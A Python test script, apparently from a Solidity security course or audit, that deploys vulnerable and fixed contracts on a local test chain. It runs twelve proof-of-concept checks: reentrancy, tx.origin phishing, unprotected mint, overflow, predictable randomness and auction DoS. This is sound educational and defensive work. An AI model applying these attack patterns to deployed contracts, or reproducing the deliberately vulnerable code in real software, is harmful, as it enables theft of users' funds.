# A23 · Har bir zaiflik uchun Proof of Concept: hujum Zaif.sol da ishlaydi, Tuzatilgan.sol da ishlamaydi (12 ta tekshiruv)
# Ishga tushirish: python test_audit.py            · faqat zaif kontraktlar: python test_audit.py --faqat-zaif
import sys, solcx
from web3 import Web3, EthereumTesterProvider
from eth_utils import keccak

solcx.install_solc("0.8.28")
B = {k.split(":")[1]: v for k, v in solcx.compile_files(["Zaif.sol", "Hujumlar.sol", "Tuzatilgan.sol"],
     output_values=["abi", "bin"], solc_version="0.8.28").items()}
w3 = Web3(EthereumTesterProvider()); A = w3.eth.accounts; E = 10**18
EGASI, QURBON, HUJUMCHI = A[0], A[1], A[7]
def dep(n, *a, frm=0, value=0):
    r = w3.eth.wait_for_transaction_receipt(w3.eth.contract(abi=B[n]["abi"], bytecode=B[n]["bin"]).constructor(*a).transact({"from": A[frm] if isinstance(frm, int) else frm, "value": value}))
    return w3.eth.contract(address=r.contractAddress, abi=B[n]["abi"])
def tx(f, frm=EGASI, **kw): return w3.eth.wait_for_transaction_receipt(f.transact({"from": frm, **kw}))
def otdimi(f, frm=EGASI, **kw):
    try: tx(f, frm, **kw); return True
    except Exception: return False
bal = w3.eth.get_balance
ball, natijalar = 0, []
def tek(nom, fn):
    global ball
    try: ok = bool(fn())
    except Exception as e: ok, nom = False, nom + f"  [{type(e).__name__}: {str(e)[:60]}]"
    ball += ok; natijalar.append(("✓ " if ok else "✗ ") + nom)

def bank(nom):
    b = dep(nom); tx(b.functions.qoy(), QURBON, value=5 * E)                   # boshqa mijozning 5 ETH i
    h = dep("BankHujum", b.address, frm=HUJUMCHI)
    otdimi(h.functions.hujum(), HUJUMCHI, value=E)
    return bal(b.address) == 0, bal(b.address) == 5 * E
tek("1a Reentrancy: ZaifBank bo'shatildi (6 ETH hujumchida)", lambda: bank("ZaifBank")[0])
tek("1b Reentrancy: BankTuzatilgan'da mijozning 5 ETH i joyida", lambda: bank("BankTuzatilgan")[1])

def hamyon(nom):
    hm = dep(nom, value=3 * E)
    s = dep("SoxtaAirdrop", frm=HUJUMCHI); oldin = bal(HUJUMCHI)
    otdimi(s.functions.bepulNFTol(hm.address), EGASI)                          # egasi “bepul NFT” tugmasini bosdi
    return bal(HUJUMCHI) - oldin == 3 * E, bal(hm.address) == 3 * E
tek("2a tx.origin: egasi soxta saytda bosgan zahoti hamyon bo'shadi", lambda: hamyon("ZaifHamyon")[0])
tek("2b tx.origin: HamyonTuzatilgan'da hujum rad etildi", lambda: hamyon("HamyonTuzatilgan")[1])

def token(nom):
    t = dep(nom); ok = otdimi(t.functions.mint(HUJUMCHI, 10**6 * E), HUJUMCHI)
    return ok and t.functions.balanceOf(HUJUMCHI).call() == 10**6 * E, not ok
tek("3a Ruxsat nazorati yo'q: hujumchi o'ziga 1 mln token chiqardi", lambda: token("ZaifToken")[0])
tek("3b TokenTuzatilgan: begona mint rad etildi", lambda: token("TokenTuzatilgan")[1])

def ommaviy(nom):
    o = dep(nom, frm=HUJUMCHI)                                                # hujumchida 1000 token bor
    ok = otdimi(o.functions.ommaviyOtkaz([A[2], A[3]], 2**255), HUJUMCHI)     # 2 × 2²⁵⁵ = 2²⁵⁶ → 0 ga “aylanadi”
    return ok and o.functions.balanceOf(A[2]).call() == 2**255, not ok
tek("4a unchecked to'lib ketish: 2 oluvchi 2²⁵⁵ tadan token oldi (BEC, 2018)", lambda: ommaviy("ZaifOmmaviy")[0])
tek("4b OmmaviyTuzatilgan: ko'paytma to'lib ketganda tranzaksiya bekor", lambda: ommaviy("OmmaviyTuzatilgan")[1])

def lotereya_zaif():
    l = dep("ZaifLotereya", value=E); h = dep("LotereyaHujum", frm=HUJUMCHI); oldin = bal(HUJUMCHI)
    r = tx(h.functions.hujum(l.address), HUJUMCHI, value=E // 10)
    return bal(l.address) == 0 and bal(HUJUMCHI) - oldin + r.gasUsed * r.effectiveGasPrice == E
tek("5a Bashorat qilinadigan tasodif: hujumchi birinchi urinishda kassani yutdi", lotereya_zaif)
def lotereya_tuz():
    sir = keccak(text="faqat o'qituvchi biladi")
    l = dep("LotereyaTuzatilgan", keccak(sir), 3600, value=E); h = dep("LotereyaHujum", frm=HUJUMCHI)
    otdimi(h.functions.hujum(l.address), HUJUMCHI, value=E // 10)              # garov qilinadi, lekin darhol yutuq yo'q
    return bal(l.address) == E + E // 10 and not l.functions.ochildi().call()
tek("5b Commit-reveal: natija o'yin yopilguncha noma'lum, darhol yutish imkonsiz", lotereya_tuz)

def auksion(nom):
    a = dep(nom); b = dep("AuksionBloklovchi", frm=HUJUMCHI)
    tx(b.functions.hujum(a.address), HUJUMCHI, value=E)                       # bloklovchi yetakchi bo'ldi
    return otdimi(a.functions.taklif(), A[2], value=2 * E)                    # halol ishtirokchi yuqoriroq taklif beradi
tek("6a DoS: bloklovchidan keyin hech kim taklif bera olmaydi", lambda: not auksion("ZaifAuksion"))
tek("6b AuksionTuzatilgan (pull): auksion davom etadi", lambda: auksion("AuksionTuzatilgan"))

if "--faqat-zaif" in sys.argv:
    natijalar = [n for n in natijalar if n[2] == "a" or n[3] == "a"]
print("\n".join(natijalar)); print(f"\nNATIJA: {sum(n.startswith('✓') for n in natijalar)}/{len(natijalar)}")
